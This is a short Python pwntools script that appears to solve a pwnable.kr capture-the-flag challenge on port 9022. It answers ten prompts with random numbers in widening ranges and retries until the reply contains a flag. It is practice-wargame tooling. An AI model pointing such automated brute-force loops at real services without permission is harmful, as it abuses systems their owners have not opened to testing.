from pwn import *
import random

hostname = "pwnable.kr"
portnum  = 9022

def run_tests():

    response = 8
    p = remote(hostname, portnum)

    for x in range(10):
        message = p.recvuntil(": ")
        for m in message.split(b"\n"):
            print(m)
        num = random.randrange((response << x),(response << (x+1)))
        print(f"Sending num: {num}")
        p.sendline(str(num))

    data = b""
    try:
        while(1):
            data += p.recv(1024,timeout=.1)
    except:
        data += b"EOF"

    return data

def main():
    while(1):
        output = run_tests()
        for o in output.split(b"\n"):
            print(o)
        if b"flag" in output:
            print("Found flag. Exiting...")
            exit(1)

if __name__ == "__main__":
    main()
